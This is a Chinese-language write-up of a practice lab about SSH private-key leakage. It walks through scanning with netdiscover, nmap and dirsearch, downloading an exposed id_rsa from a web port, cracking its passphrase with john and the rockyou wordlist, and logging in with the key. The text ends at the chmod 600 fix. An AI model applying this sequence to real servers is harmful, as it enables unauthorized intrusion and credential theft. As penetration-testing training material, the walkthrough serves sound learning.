ssh私钥泄露靶场

云盘下载靶场

https://pan.baidu.com/s/14Gh7qsFAncBY4g11xHJRhw 提取码：asdf

必须改成NAT，不然扫不到ip

导入虚拟机，发现登陆不了

测试同网段ip：

netdiscover -r 192.168.95.0/24

ssh虚拟机ip是192.168.95.128

nmap

利用nmap端口扫描工具，-sV：对开放端口做探测，识别端口上运行的软件 + 版本号

nmap -sV 192.168.95.128

开放了80和31337两个端口，先看一下80端口：

31337端口

都没有用的信息。

dirsearch扫目录：

dirsearch -u "http://192.168.95.128:31337/"

访问 /.ssh

私钥与公钥

id_rsa：私钥
id_rsa.pub：公钥
authorized_keys：数字签名

访问公钥192.168.95.128:31337/.ssh/id_rsa.pub自动下载了，在终端打开：

ssh-rsa 【一大串公钥加密字符串】 用户名@主机名

私钥的打开需要密码

爆破

先解压字典：

gunzip /usr/share/wordlists/rockyou.txt.gz

（把 .gz 压缩格式的密码字典解压为文本字典文件，供 john 工具调用。）

进行爆破：

john --wordlist=/usr/share/wordlists/rockyou.txt --format=ssh rsacrack
  • --wordlist：指定爆破使用的密码字典路径
  • --format=ssh：指定待爆破哈希的类型为 SSH 私钥哈希
  • rsacrack：由 ssh2john.py 输出得到的私钥哈希文件

查看结果：

john --show rsacrack

私钥解密密码 id_rsa:starwars

尝试登陆：

ssh -i id_rsa simon@192.168.95.128

失败原因：私钥文件权限不能对外开放，现在 id_rsa 权限是 644，其他用户可读，SSH 直接拒绝加载这个私钥，忽略文件，登录失败。

仅允许所有者读写：

chmod 600 id_rsa
